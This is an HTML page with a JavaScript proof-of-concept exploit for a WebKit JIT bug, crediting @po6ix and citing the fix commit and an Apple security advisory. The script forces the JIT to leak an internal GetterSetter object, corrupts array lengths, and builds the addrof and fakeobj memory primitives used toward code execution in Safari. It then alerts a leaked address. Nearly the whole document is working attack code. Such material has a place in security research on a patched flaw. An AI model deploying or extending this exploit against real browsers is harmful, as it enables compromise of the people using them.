<html>
<body>
<script src="/util.js"></script>
<script src="/int64.js"></script>
<script>
/*
author: @po6ix
commit: https://github.com/WebKit/WebKit/commit/08d5d17c766ffc7ca6a7c833c5720eb71b427784
advisory: https://support.apple.com/en-us/HT213926
*/
let ref_arr = [];

let boxed_arr = new Function(0);
boxed_arr.p1 = 1.1;
boxed_arr[0] = {};

let object_a = {};
object_a.foo = 1;
object_a.p1 = 1.1;

let getter = () => {
    return 1337;
};
getter.p1 = 0x1337;
getter[0] = 1.1;

let object_b = {};
object_b.__defineGetter__('p1', getter);
object_b.foo = 1;

let shape = {};
for (let i = 0; i < 14; ++i) {
    shape['q'+i] = i;
}

let shapes = [];
for (let i = 0; i < 0x100; ++i) {
    shapes.push({
        ...shape,
        [i]: 0x1337
    });
}

function access_to_getterSetter(type) {
    let tmp, x;

    if (type == 0) tmp = object_a;
    else tmp = object_b;

    for (let i = 0; i < 2; ++i) {
        if (type == 0) x = tmp.foo;
        else x = tmp.foo;
    }
    return x;
}

(function pwn() {
    for (let j = 0; j < 2; ++j) {
        for (let i = 0; i < 1e6; ++i) {
            access_to_getterSetter(i % 2);
        }
    }

    let getterSetter = access_to_getterSetter(1);
    let success = false;
    try {
        getterSetter.toString();
    } catch(e) {
        // it should fail to call toString
        success = true;
    }
    if (!success) {
        alert('failed to get getterSetter');
        return;
    }

    let symbolObject = Object(getterSetter);

    for (let i = 0; i < 0x470; ++i) {
        ref_arr.push(symbolObject.description);
    }

    getter.q13 = 1.1; // change the length of boxed_arr
    let unboxed_arr = getter;
    
    function addrof(o) {
        boxed_arr[8] = o;
        return Int64.fromDouble(unboxed_arr[0]);
    }

    function fakeobj(addr) {
        unboxed_arr[0] = addr.asDouble();
        return boxed_arr[8];
    }

    alert(addrof({}).toString());
    while(1);
})();

</script>
</body>
</html>